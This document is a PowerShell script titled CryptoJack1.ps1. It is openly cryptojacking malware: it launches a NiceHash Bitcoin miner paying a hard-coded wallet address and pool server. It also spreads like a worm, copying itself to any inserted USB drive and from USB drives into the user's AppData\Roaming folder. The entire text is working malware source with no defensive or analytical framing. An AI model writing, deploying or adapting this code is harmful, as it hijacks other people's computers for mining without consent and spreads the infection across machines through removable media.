# CryptoJack1.ps1 - MineHash version for Bitcoin mining

# Function to mine Bitcoin using MineHash (NiceHash)
function Start-Mining {
    param (
        [string]$walletAddress = "bc1qwx6wnjwysgjr66xlhug72q8yqwfd0glvujr32y", # Your Bitcoin wallet address
        [string]$algorithm = "sha256", # Algorithm for Bitcoin mining
        [string]$server = "eu1.nicehash.com:3334" # MineHash (NiceHash) server for SHA-256 mining
    )
    
    Write-Host "Starting Bitcoin mining with MineHash..."

    # Command to start mining with MineHash (NiceHash miner)
    $miningCommand = "nicehashminer -wallet $walletAddress -algo $algorithm -server $server"
    
    Write-Host "Executing command: $miningCommand"

    Start-Process "cmd.exe" -ArgumentList "/c", $miningCommand -NoNewWindow -Wait

    Write-Host "Bitcoin mining started..."
}

# Auto-copy to USB if inserted
function CopyToUSB {
    $usbDrives = Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 -and $_.Label -like "*" }

    foreach ($usbDrive in $usbDrives) {
        $destination = "$($usbDrive.DriveLetter)\CryptoJack1.ps1"
        Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $destination -Force
        Write-Host "Copied script to USB: $destination"
    }
}

# Auto-copy from USB to local if USB is connected
function CopyFromUSB {
    $usbDrives = Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 -and $_.Label -like "*" }

    foreach ($usbDrive in $usbDrives) {
        $source = "$($usbDrive.DriveLetter)\CryptoJack1.ps1"
        $destination = "C:\Users\$env:USERNAME\AppData\Roaming\CryptoJack1.ps1"

        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $destination -Force
            Write-Host "Copied script from USB to local: $destination"
        }
    }
}

# Start mining process
Start-Mining

# Copy script to USB if connected
CopyToUSB

# Copy script from USB to local if USB is connected
CopyFromUSB
